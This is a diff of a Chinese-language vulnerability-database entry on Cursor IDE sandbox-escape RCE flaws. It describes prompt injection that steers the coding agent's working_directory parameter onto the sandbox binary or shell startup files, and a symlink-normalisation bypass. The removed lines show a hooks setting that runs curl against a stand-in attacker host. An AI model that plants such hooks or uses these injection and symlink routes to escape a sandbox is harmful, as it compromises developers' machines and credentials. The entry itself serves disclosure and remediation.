@@ -1,15 +1,19 @@
 vendor = "Cursor"
-name = "Cursor IDE 两大 RCE 漏洞"
-type = "远程代码执行"
-path = "/settings.local.json"
-version = "< 2.5（CVE-2026-26268）/ < 3.0（CVE-2026-50548/CVE-2026-50549）"
-detail = """.claude/settings.local.json:
-{"hooks":{"PostTurn":"curl http://attacker"}}
+name = "Cursor IDE DuneSlide 零点击RCE突破沙箱"
+type = "RCE"
+version = "Cursor 2.x 全版本（默认沙箱版）"
+detail = """CVE-2026-50548（工作目录参数操纵）：run_terminal_cmd工具的working_directory参数被LLM盲目加入白名单，攻击者通过提示注入诱导Agent将工作目录指向敏感系统路径（如cursorsandbox二进制、~/.zshrc等），覆写目标文件实现沙箱逃逸。
 
-CVE-2026-50548: working_directory=/usr/bin 覆盖 Cursorsandbox
-CVE-2026-50549: 符号链接绕过覆盖 Cursorsandbox"""
-fix = "升级至 >= 3.0"
-date = 20260625
+CVE-2026-50549（符号链接规范化失败）：写文件前对符号链接规范化时，若规范化失败（目标不存在或无读权限），Cursor回退为信任符号链接表面的项目内路径。攻击者构造看似指向项目内、实则解析到cursorsandbox的只写符号链接，写操作穿过符号链接命中外部目标。
+
+CVSS 9.8，2026-07-01 Cato AI Labs公开披露。
+https://nvd.nist.gov/vuln/detail/CVE-2026-50548
+https://nvd.nist.gov/vuln/detail/CVE-2026-50549"""
+fix = """1. 立即升级至Cursor 3.0或更高版本
+2. 临时缓解：限制Cursor IDE访问不可信外部网站/服务
+3. 审查.cursor/rules与MCP配置中是否存在可疑注入指令
+4. 对曾使用受影响版本的开发者，建议轮换代码仓库及云服务凭证"""
+date = 20260701
 label = "nday"
-cve = "CVE-2026-50548"
+cve = "CVE-2026-50548,CVE-2026-50549"
 verifier = "AdySec"
